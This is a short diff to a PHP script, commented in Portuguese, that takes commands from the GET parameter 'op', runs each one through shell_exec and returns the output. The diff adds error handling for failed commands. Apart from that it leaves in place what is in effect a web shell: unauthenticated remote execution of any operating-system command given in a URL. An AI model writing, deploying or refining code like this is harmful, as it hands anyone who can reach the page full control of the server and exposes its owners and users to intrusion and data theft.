@@ -14,8 +14,14 @@ if (isset($_GET['op'])) {
     foreach ($commands as $command) {
         $command = trim($command);
 
-        // Executar o comando no sistema operacional
-        $output .= shell_exec($command) . "\n";
+        // Executar o comando no sistema operacional e capturar a saída
+        $command_output = shell_exec($command);
+
+        if ($command_output === null) {
+            $output .= "Erro ao executar o comando: $command\n";
+        } else {
+            $output .= $command_output . "\n";
+        }
     }
 } else {
     $output = "Nenhum comando especificado.";
